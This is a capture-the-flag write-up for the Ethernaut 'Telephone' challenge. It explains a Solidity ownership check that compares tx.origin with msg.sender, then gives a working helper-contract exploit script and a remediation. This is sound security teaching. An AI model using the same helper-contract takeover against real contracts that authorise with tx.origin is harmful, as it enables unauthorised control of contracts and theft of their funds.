# Telephone — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 04 — Telephone](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-telephone) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Telephone.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`changeOwner` updates `owner` only when `tx.origin != msg.sender`. That condition is true whenever a contract sits between the EOA and `Telephone`. An attacker deploys a tiny helper, calls it from their EOA, and the helper calls `changeOwner(player)`.

**Impact:** unprivileged ownership takeover. Same anti-pattern enables phishing drains when wallets authorize with `tx.origin`.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player is `owner` | `telephoneInstance.owner() == PLAYER_ADDRESS` |

**Starting state:** `owner` = deployer / factory.

---

## Contract overview

```solidity
contract Telephone {
    address public owner;
    constructor()              // owner = msg.sender
    changeOwner(address)       // sets owner if tx.origin != msg.sender
}
```

---

## Finding

### [C-01] Broken auth via `tx.origin != msg.sender`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Access control / `tx.origin` authentication |
| **Location** | `src/Telephone.sol:12-16` |
| **CWE** | [CWE-284](https://cwe.mitre.org/data/definitions/284.html) — Improper Access Control |
| **SWC** | [SWC-115](https://swcregistry.io/docs/SWC-115) — Authorization through tx.origin |

#### Description

`tx.origin` is the original EOA that started the transaction. `msg.sender` is the immediate caller. For `EOA → Contract → Telephone`, they differ, so the `if` passes and anyone can set `owner`.

#### Vulnerable code

```12:16:web3-ctf-challenges/04-ethernaut-telephone/src/Telephone.sol
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
```

#### Impact

Complete ownership takeover in one transaction (deploy helper + call).

#### Likelihood

**Certain** for any attacker who can deploy a contract.

#### Proof of concept

```bash
cd web3-ctf-challenges/04-ethernaut-telephone
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 274506)
```

---

## Attack scenario

```
Player (EOA)                  HelperContract              Telephone
     |                              |                         |
     |-- new Helper --------------->|                         |
     |-- attack(target, player) --->|                         |
     |   tx.origin = player         |-- changeOwner(player) ->|
     |                              |   msg.sender = Helper   |
     |                              |   tx.origin != msg.sender
     |                              |   owner = player        |
```

### Step-by-step (7-question gate)

| Step | Answer |
|------|--------|
| **1. Setup** | Deploy `HelperContract` |
| **2. Call** | `helper.attack(telephone, player)` from player EOA |
| **3. Result** | `owner == player` |
| **4. Cost** | Deploy + call gas |
| **5. ROI** | Full ownership |
| **6. Privileged access?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH platform (`Exploit.s.sol`)

```solidity
contract HelperContract {
    function attack(address target, address newOwner) external {
        Telephone(target).changeOwner(newOwner);
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    HelperContract helper = new HelperContract();
    helper.attack(address(telephoneInstance), PLAYER_ADDRESS);

    vm.stopBroadcast();
}
```

### Local Foundry test

See `test/TelephoneExploit.t.sol` — also asserts a direct EOA call does **not** change ownership.

---

## Verification checklist

- [x] Direct EOA `changeOwner` leaves deployer as owner
- [x] Via helper, `owner == player`
- [x] Local Foundry test passes

---

## Remediation

```solidity
function changeOwner(address _owner) public {
    require(msg.sender == owner, "not owner");
    owner = _owner;
}
```

Or use OpenZeppelin `Ownable`. **Never** gate privileges on `tx.origin`.

---

## Key lessons

1. **`tx.origin` ≠ `msg.sender`** — intermediate contracts break equality.
2. **`tx.origin` auth is a phishing footgun** — victim EOA can be tricked into calling a malicious contract that acts as them.
3. **Authorize with `msg.sender`** (or a proper ACL), not the transaction origin.

---

## References

- [OpenZeppelin Ethernaut — Telephone](https://ethernaut.openzeppelin.com/)
- [SCH Telephone challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-telephone)
- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)
- Local artifacts: `Exploit.s.sol`, `script/Exploit.s.sol`, `test/TelephoneExploit.t.sol`
